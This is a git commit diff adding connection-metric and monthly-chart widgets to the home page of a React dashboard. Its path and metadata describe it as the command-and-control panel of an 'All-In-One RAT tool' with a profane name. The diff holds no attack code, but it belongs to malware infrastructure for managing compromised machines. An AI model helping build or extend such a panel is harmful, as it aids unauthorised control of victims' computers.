0f2a2e17edd876ea06b2c44c560af92f660acba1
Jefrey <hernandezrodriguezjefrey@gmail.com>
2025-12-17 01:20:56 +0100

    12/17/25 - Home page updated to the latest available components

--- src/server/c2c/frontend/src/pages/Dashboard/Home.tsx
+++ src/server/c2c/frontend/src/pages/Dashboard/Home.tsx
@@ -1,5 +1,8 @@
 import Metadata from "../../components/common/Metadata";
 import StatisticsChart from "../../components/metrics/StatisticsChart";
+import ConnectionMetrics from "../../components/metrics/ConnectionsMetrics";
+import MonthlyConnectionsChart from "../../components/metrics/MonthlyConnectionsChart";
+import MonthlyTarget from "../../components/metrics/MonthlyTarget";
 
 export default function Home() {
     return (
@@ -9,7 +12,19 @@ export default function Home() {
                 description = "This is the home page of the Fuckhugo All-In-One RAT tool"
             />
 
+            <div className="grid grid-cols-12 gap-4 md:gap-6">
+                <div className="col-span-12 space-y-6 xl:col-span-7">
 
+                    <ConnectionMetrics/>
+                    <MonthlyConnectionsChart/>
+
+                </div>
+
+                <div className="col-span-12 xl:col-span-5">
+                    <MonthlyTarget/>
+                </div>
+
+            </div>
 
         </>
     );
